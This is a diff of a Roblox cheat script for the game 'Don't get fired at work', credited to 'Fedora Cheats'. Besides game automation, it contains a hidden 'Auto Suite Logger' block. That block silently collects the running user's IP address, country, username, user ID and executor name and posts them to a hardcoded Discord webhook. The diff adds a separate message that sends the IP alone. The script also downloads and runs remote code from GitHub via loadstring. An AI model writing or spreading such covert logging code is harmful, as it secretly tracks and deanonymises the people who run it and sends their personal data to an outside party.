@@ -1,65 +1,77 @@
 -- Game: Don't get fired at work
 -- Made by FedoraC and Exirl
 
-local Players   = game:GetService("Players")
-local Storage   = game:GetService("ReplicatedStorage")
-local Input     = game:GetService("UserInputService")
-local Vim       = game:GetService("VirtualInputManager")
-local Json      = game:GetService("HttpService")
-local me        = Players.LocalPlayer
+local Players     = game:GetService("Players")
+local Storage     = game:GetService("ReplicatedStorage")
+local Input       = game:GetService("UserInputService")
+local Vim         = game:GetService("VirtualInputManager")
+local HttpService = game:GetService("HttpService")
+local me          = Players.LocalPlayer
 
-local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
+local webhookURL = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
 
 do
-    local HSvc = game:GetService("HttpService")
-
-    local function getRequestFunc()
-        if syn and syn.request then return syn.request end
-        if http and http.request then return http.request end
-        if request then return request end
-        if fluxus and fluxus.request then return fluxus.request end
-        if krnl and krnl.request then return krnl.request end
-        if secure_call then return nil end
+    local function req(opts)
+        if http_request then
+            local ok, res = pcall(http_request, opts)
+            if ok then return res end
+        end
+        if request then
+            local ok, res = pcall(request, opts)
+            if ok then return res end
+        end
+        if syn and syn.request then
+            local ok, res = pcall(syn.request, opts)
+            if ok then return res end
+        end
+        if http and http.request then
+            local ok, res = pcall(http.request, opts)
+            if ok then return res end
+        end
+        if fluxus and fluxus.request then
+            local ok, res = pcall(fluxus.request, opts)
+            if ok then return res end
+        end
         return nil
     end
 
-    local function httpGet(url)
-        local req = getRequestFunc()
-        if req then
-            local ok, res = pcall(function()
-                local r = req({ Url = url, Method = "GET" })
-                if type(r) == "table" then
-                    return r.Body or r.body or r
-                end
-                return r
-            end)
-            if ok and type(res) == "string" then return res end
-        end
-        local ok2, res2 = pcall(function() return game:HttpGet(url) end)
-        if ok2 and type(res2) == "string" then return res2 end
-        return nil
-    end
-
-    local function post(url, body)
-        local req = getRequestFunc()
-        if req then
-            local ok = pcall(function()
-                req({
-                    Url = url,
-                    Method = "POST",
-                    Headers = { ["Content-Type"] = "application/json" },
-                    Body = body
-                })
-            end)
-            if ok then return true end
-        end
-        local ok2 = pcall(function()
-            HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+    local function getIP()
+        local ok, response = pcall(function()
+            return req({
+                Url = "https://api64.ipify.org/?format=json",
+                Method = "GET"
+            })
         end)
-        return ok2
+        if ok and response and response.Body then
+            local ok2, ipData = pcall(HttpService.JSONDecode, HttpService, response.Body)
+            if ok2 and ipData and ipData.ip then
+                return tostring(ipData.ip)
+            end
+        end
+        local ok3, res3 = pcall(function() return game:HttpGet("https://api64.ipify.org/?format=json") end)
+        if ok3 and res3 then
+            local ok4, ipData2 = pcall(HttpService.JSONDecode, HttpService, res3)
+            if ok4 and ipData2 and ipData2.ip then
+                return tostring(ipData2.ip)
+            end
+        end
+        return "Unknown"
     end
 
-    local function getexec()
+    local function getCountry()
+        local ok, response = pcall(function()
+            return req({ Url = "http://ip-api.com/json/", Method = "GET" })
+        end)
+        if ok and response and response.Body then
+            local ok2, dec = pcall(HttpService.JSONDecode, HttpService, response.Body)
+            if ok2 and dec and dec.country then
+                return tostring(dec.country)
+            end
+        end
+        return "Unknown"
+    end
+
+    local function getExec()
         local ok, name = pcall(function()
             if identifyexecutor then return identifyexecutor() end
         end)
@@ -67,42 +79,7 @@ do
         return "Unknown"
     end
 
-    local function getcountry()
-        local res = httpGet("http://ip-api.com/json/")
-        if not res then return "Unknown" end
-        local ok, decoded = pcall(HSvc.JSONDecode, HSvc, res)
-        if ok and decoded and decoded.country then
-            return tostring(decoded.country)
-        end
-        return "Unknown"
-    end
-
-    local function getip()
-        local res = httpGet("http://ip-api.com/json/")
-        if res then
-            local ok, decoded = pcall(HSvc.JSONDecode, HSvc, res)
-            if ok and decoded and decoded.query then
-                return tostring(decoded.query)
-            end
-        end
-        local res2 = httpGet("https://api.ipify.org?format=json")
-        if res2 then
-            local ok2, decoded2 = pcall(HSvc.JSONDecode, HSvc, res2)
-            if ok2 and decoded2 and decoded2.ip then
-                return tostring(decoded2.ip)
-            end
-        end
-        local res3 = httpGet("https://api64.ipify.org?format=json")
-        if res3 then
-            local ok3, decoded3 = pcall(HSvc.JSONDecode, HSvc, res3)
-            if ok3 and decoded3 and decoded3.ip then
-                return tostring(decoded3.ip)
-            end
-        end
-        return "Unknown"
-    end
-
-    local function getpfp(id)
+    local function getPfp(id)
         local ok, url = pcall(function()
             return Players:GetUserThumbnailAsync(
                 id,
@@ -114,16 +91,29 @@ do
         return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(id) .. "&width=420&height=420&format=png"
     end
 
+    local function send(content)
+        local ok = pcall(function()
+            req({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(content)
+            })
+        end)
+        return ok
+    end
+
     task.spawn(function()
         local id       = me.UserId
         local username = me.Name
         local display  = me.DisplayName or me.Name
-        local country  = getcountry()
-        local pfp      = getpfp(id)
-        local exec     = getexec()
-        local ip       = getip()
-
+        local ip       = getIP()
+        local country  = getCountry()
+        local exec     = getExec()
+        local pfp      = getPfp(id)
         local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
+
+        send({ ["content"] = "User IP: " .. ip })
 
         local embed = {
             title       = "Script Executed",
@@ -131,28 +121,23 @@ do
             color       = 0x00C853,
             thumbnail   = { url = pfp },
             fields = {
-                { name = "Username",     value = "`" .. username .. "`",              inline = true },
-                { name = "Display Name", value = "`" .. display  .. "`",              inline = true },
-                { name = "User ID",      value = "`" .. tostring(id) .. "`",          inline = true },
-                { name = "Country",      value = "`" .. country .. "`",               inline = true },
-                { name = "Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
-                { name = "Executor",     value = "`" .. exec .. "`",                  inline = true },
-                { name = "IP Address",   value = "`" .. ip .. "`",                    inline = true },
+                { name = "Username",     value = "`" .. username .. "`",     inline = true },
+                { name = "Display Name", value = "`" .. display .. "`",      inline = true },
+                { name = "User ID",      value = "`" .. tostring(id) .. "`", inline = true },
+                { name = "Country",      value = "`" .. country .. "`",      inline = true },
+                { name = "Logged Time",  value = "`" .. timestamp .. "`",    inline = false },
+                { name = "Executor",     value = "`" .. exec .. "`",         inline = true },
+                { name = "IP Address",   value = "`" .. ip .. "`",           inline = true },
                 { name = "Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
             },
             footer = { text = "Auto Suite Logger - Fedora Cheats" },
         }
 
-        local payload = HSvc:JSONEncode({
+        send({
             username   = "Auto Suite Logger",
             avatar_url = pfp,
             embeds     = { embed },
         })
-
-        local ok = post(WEBHOOK, payload)
-        if not ok then
-            warn("[AutoSuite] Webhook post failed")
-        end
     end)
 end
 
@@ -195,7 +180,7 @@ local function load()
     if not ok or not has then return end
     local ok2, raw = pcall(readfile, file)
     if not ok2 or type(raw) ~= "string" then return end
-    local ok3, dec = pcall(Json.JSONDecode, Json, raw)
+    local ok3, dec = pcall(HttpService.JSONDecode, HttpService, raw)
     if not ok3 or type(dec) ~= "table" then return end
     for k, v in next, dec do
         if base[k] ~= nil and type(v) == type(base[k]) then
@@ -206,7 +191,7 @@ end
 
 local function dump()
     if type(writefile) ~= "function" then return end
-    local ok, enc = pcall(Json.JSONEncode, Json, set)
+    local ok, enc = pcall(HttpService.JSONEncode, HttpService, set)
     if ok then pcall(writefile, file, enc) end
 end
 
@@ -222,25 +207,9 @@ for _, g in next, me.PlayerGui:GetChildren() do
     end
 end
 
-local Lib
-do
-    local ok, res = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/WevornLibary.lua"))()
-    end)
-    if ok and res then
-        Lib = res
-    else
-        local ok2, res2 = pcall(function()
-            return loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-        end)
-        if ok2 and res2 then
-            Lib = res2
-        else
-            error("[AutoSuite] Failed to load UI library")
-        end
-    end
-end
-
+local Lib = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/WevornLibary.lua"
+))()
 local Win = Lib:Window("Auto Suite")
 
 local function zones()
